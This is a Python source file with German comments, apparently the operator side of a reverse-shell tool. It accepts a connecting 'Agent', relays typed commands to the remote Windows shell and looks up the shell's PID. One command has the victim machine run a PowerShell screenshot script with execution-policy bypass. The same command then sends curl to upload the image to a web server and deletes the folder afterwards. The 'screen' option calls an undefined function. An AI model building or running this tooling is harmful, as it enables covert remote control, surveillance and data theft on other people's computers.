import socket
import os
import threading
import time

showData = False

def listening():
    while True:
        data = clientsock.recv(65500)
        if showData == True:
            # print(data.decode())
            try:
                # Versuche, die Daten mit UTF-8 zu dekodieren
                print(data.decode('utf-8'))
            except UnicodeDecodeError:
                # Wenn UTF-8 fehlschlägt, verwende eine alternative Kodierung wie cp1252
                print(data.decode('cp1252', errors='replace'))
        
def showHelp():
    print('''
          Installierte Commands:
          
          Die ReverseShell ist automatisch nach der Verbindung geöffnet. Jedes Kommando wird direkt vom Agent empfangen.
          Teste es mit 'whoami'. 
          
          [screen] - Screenshot
          [exit] - Schließen
          [help] - Hilfe öffnen
          
          ''')
    
    
    

    


    

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 4422)
    print(f"Starting up on {server_address}")
    sock.bind(server_address)
    sock.listen(1)

    clientsock, (ip,port) = sock.accept()
    print(f"[+] New Agent connect from {ip}:{port}")
    print("[+] PID der Shell wird ermittelt..")
    threading.Thread(target=listening).start()
    
    CMDCODE = r'''
powershell.exe -W Normal -nop -ep bypass -C ^

$ScreenWidth = "Get-WmiObject -Class Win32_DesktopMonitor | Select-Object -ExpandProperty ScreenWidth"; ^

echo $ScreenWidth; ^

$ScreenHeight = "Get-WmiObject -Class Win32_DesktopMonitor | Select-Object -ExpandProperty ScreenHeight"; ^

echo $ScreenHeight; ^

"[Reflection.Assembly]::LoadWithPartialName('System.Drawing')";^

"function screenshot([Drawing.Rectangle]$bounds, $path) {$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size); $bmp.Save($path); $graphics.Dispose(); $bmp.Dispose()}";^

$bounds = "[Drawing.Rectangle]::FromLTRB(0, 0, $ScreenWidth, $ScreenHeight)";^

if(-not(Test-Path -Path "$env:TEMP\screenshot")){mkdir $env:TEMP\screenshot};^

screenshot $bounds "$env:TEMP\screenshot\screenshot.png";'''
    
    PID = ""
    clientsock.send('title mycmd'.encode())
    time.sleep(1)
    clientsock.send('tasklist /v /fo csv | findstr /i "mycmd"'.encode())
    antwort = clientsock.recv(65500).decode()
    
    antwortList = antwort.split(',')
    PID = antwortList[1].strip('"')
    print(f'[+] PID ist {PID}')
    
    
    while True:
        
        #try:
        #    data = clientsock.recv(65500)
        #    if data:
        #        print("Hier: " + data.decode())
        #except ConnectionResetError:
        #    print(f"\nConnection with {ip}:{port} lost.")
        
        
        command = input("Command:")
        showData = True
        if command.lower() == "exit":
            clientsock.send("^C".encode())
            sock.close()
            print("Verbindung wird geschlossen.")
            break
        elif command.lower() == "help":
            showHelp()
            continue
        elif command.lower() == "screen":
            screenshot()
        elif command.lower() == "test":
            time.sleep(1)
            clientsock.send("echo %TEMP%".encode())
            envTEMP = clientsock.recv(65500).decode()
            envTEMPconvertiert = envTEMP.replace("\\","/").rstrip()
            
            clientsock.send(CMDCODE.encode())   
            
            #Send Screenshot with curl to a Webserver
            curlCommand = f'curl -X POST -F "file=@{envTEMPconvertiert}/screenshot/screenshot.png" http://127.0.0.1:5000/upload' 
            clientsock.send(curlCommand.encode())
            
            #Folder löschen nach upload
            delCommand = f'rmdir /s /q {envTEMP.rstrip()}' + '\\screenshot'
            clientsock.send(delCommand.encode())
            
            
            
            
            continue        
        
            
        
        clientsock.send(command.encode())
        
        
    
    

